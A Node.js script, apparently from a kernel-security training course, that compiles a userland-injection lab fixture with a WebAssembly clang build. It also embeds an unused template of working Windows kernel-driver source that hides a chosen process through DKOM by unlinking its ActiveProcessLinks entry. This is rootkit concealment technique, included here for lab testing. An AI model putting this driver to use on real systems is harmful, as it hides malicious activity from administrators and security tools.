/**
 * One-off: recompile the DKOM lab fixture after the kftarget Cid change
 * (666 -> 888, issue #6). Mirrors scripts/gen-m2-fixtures.mjs exactly.
 *
 * Usage: node scripts/gen-inject-fixture.mjs
 */
import { readFile, writeFile } from "node:fs/promises";
import path from "node:path";
import { fileURLToPath } from "node:url";

const pkgDir = path.dirname(path.dirname(fileURLToPath(import.meta.url)));
const root = path.join(pkgDir, "../..");
const distDir = path.join(root, "vendor/browsercc/dist");

const { default: Clang } = await import(
  new URL("clang.js", `file://${distDir}/`).href);

const sysrootU8 = new Uint8Array(await readFile(path.join(distDir, "sysroot.tar")));
const manifest = JSON.parse(
  await readFile(path.join(distDir, "headers-manifest.json"), "utf8"));

let stderrBuf = "";
const clang = await Clang({ thisProgram: "clang", printErr: (s) => { stderrBuf += s + "\n"; } });
const dec = new TextDecoder();
let off = 0;
while (off + 512 <= sysrootU8.length) {
  const hdr = sysrootU8.slice(off, off + 512);
  const name = dec.decode(hdr.slice(0, 100)).replace(/\0.*$/, "");
  if (!name) break;
  const size = parseInt(dec.decode(hdr.slice(124, 136)).replace(/\0.*$/, "").trim(), 8) || 0;
  if (size > 0 && !name.endsWith("/")) {
    const dir = path.posix.dirname(name);
    try { clang.FS.mkdirTree(dir); } catch { /* exists */ }
    clang.FS.writeFile(name, sysrootU8.slice(off + 512, off + 512 + size));
  }
  off += 512 + Math.ceil(size / 512) * 512;
}
for (const [vpath, b64] of Object.entries(manifest)) {
  const bytes = Uint8Array.from(Buffer.from(b64, "base64"));
  const dir = path.posix.dirname(vpath);
  try { clang.FS.mkdirTree(dir); } catch { /* exists */ }
  clang.FS.writeFile(vpath, bytes);
}
clang.FS.mkdirTree("/work");

// Byte-equivalent to what a student's browser compiles from the identical
// starter text (m21.l1 userland injection, both paths).
function pathToFileUrl(p) {
  return "file://" + path.resolve(p);
}
const { INJECT_STARTER: SOURCE } = await import(pathToFileUrl(path.join(root,
  "packages/course-content/src/starters.mjs")));
const UNUSED_TEMPLATE = `// DKOM process hiding — unlink kftarget.exe from ActiveProcessLinks
//
// Compiled fixture for the m1.l2 lab tests: locates the target _EPROCESS by
// walking the list from PsInitialSystemProcess, then overwrites its
// ActiveProcessLinks so !process / NtQuerySystemInformation go blind.

#include <ntddk.h>

VOID DriverUnload(PDRIVER_OBJECT DriverObject)
{
    UNREFERENCED_PARAMETER(DriverObject);
}

NTSTATUS DriverEntry(
    _In_ PDRIVER_OBJECT  DriverObject,
    _In_ PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(RegistryPath);

    DriverObject->DriverUnload = DriverUnload;
    HANDLE targetPid = (HANDLE)888; // kftarget.exe
    PEPROCESS system = PsInitialSystemProcess;
    if (!system) return STATUS_UNSUCCESSFUL;

    PLIST_ENTRY head = (PLIST_ENTRY)((PUCHAR)system + 0x448);
    for (PLIST_ENTRY cur = head->Flink; cur != head; cur = cur->Flink) {
        PUCHAR proc = (PUCHAR)cur - 0x448;
        if (*(HANDLE*)(proc + 0x440) != targetPid) continue;

        cur->Blink->Flink = cur->Flink;
        cur->Flink->Blink = cur->Blink;
        DbgPrint("Overwrote _LIST_ENTRY at: %p\\n", cur);
        return STATUS_SUCCESS;
    }
    DbgPrint("DKOM: target pid not found\\n");
    return STATUS_UNSUCCESSFUL;
}
`;

void UNUSED_TEMPLATE;
clang.FS.writeFile("/work/driver.c", SOURCE);
const code = clang.callMain([
  "--target=x86_64-pc-windows-msvc",
  "-O1", "-ffreestanding", "-fno-stack-protector",
  "-isystem", "/wdm/include",
  "-c", "/work/driver.c", "-o", "/work/kfulinject.obj",
]);
if (code !== 0) {
  console.error(`FAIL kfulinject.obj (clang exit ${code})`);
  console.error(stderrBuf.split("\n").filter(Boolean).slice(-15).join("\n"));
  process.exit(1);
}
const obj = clang.FS.readFile("/work/kfulinject.obj", { encoding: "binary" });
await writeFile(path.join(pkgDir, "test/fixtures/kfulinject.obj"), Buffer.from(obj));
console.log(`wrote kfulinject.obj (${obj.length} bytes)`);
